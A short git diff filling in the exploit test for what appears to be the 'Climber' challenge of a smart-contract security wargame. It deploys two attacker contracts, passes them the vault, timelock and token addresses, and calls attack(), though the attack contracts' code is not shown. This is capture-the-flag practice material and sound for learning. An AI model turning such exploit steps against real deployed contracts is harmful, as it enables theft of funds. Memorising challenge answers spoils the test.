@@ -51,8 +51,22 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {   
+        const AttackerImplementationFactory = await ethers.getContractFactory("AttackerImplementation", attacker);
+        let attackerImplementation = await AttackerImplementationFactory.deploy();
+        
+        const attackerContractFactory = await ethers.getContractFactory("ClimberAttacker", attacker);
+        let attackerContract = await attackerContractFactory.deploy(
+            this.vault.address,
+            this.timelock.address,
+            this.token.address,
+            attackerImplementation.address
+        );
+
+        await attackerContract.connect(attacker).attack();
+        
+
+    
     });
 
     after(async function () {
